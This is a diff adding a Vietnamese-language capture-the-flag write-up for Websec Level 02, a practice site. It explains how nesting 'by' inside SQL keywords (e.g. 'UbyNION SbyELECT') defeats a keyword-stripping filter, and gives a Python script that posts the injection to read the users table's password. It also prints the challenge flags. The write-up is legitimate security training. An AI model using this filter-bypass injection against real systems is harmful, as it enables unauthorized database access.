@@ -1,3 +1,4 @@
+<!-- markdownlint-disable MD024 -->
 # Websec
 
 ## Level 01
@@ -51,3 +52,48 @@ Ngoài ra, chúng ta cũng có thể sử dụng payload sau để lấy hết t
 ### Flag
 
 `WEBSEC{Simple_SQLite_Injection}`
+
+## Level 02
+
+> Nothing fancy, with a twist
+>
+> 🔥 <https://websec.fr/level02/>
+
+![image](images/level-02/image-1.png)
+
+Sang tới level 2 này, lập trình viên đã thay thế các từ `union`, `order`, `select`, `from`, `group`, `by` (không phân biệt hoa thường) thành chuỗi rỗng `''`.
+
+![image](images/level-02/image-2.png)
+
+Vậy chúng ta có thể tạo thành từ `UNION` bằng cách sử dụng `UbyNION`, những từ khoá khác cũng tạo tương tự.
+
+Mình đã viết một script Python bên dưới để lấy flag.
+
+```python
+import requests
+import re
+
+URL = "https://websec.fr/level02/index.php"
+
+payload = "1 UbyNION SbyELECT null, password FbyROM users where id=1"
+
+def solve():
+    data = {
+        "user_id": f"{payload}",
+        "submit": ""
+    }
+
+    r = requests.post(URL, data=data)
+    flag = re.search(r"WEBSEC{\w*}", r.text).group(0)
+
+    print(flag)
+
+
+if __name__ == "__main__":
+    solve()
+
+```
+
+### Flag
+
+`WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`
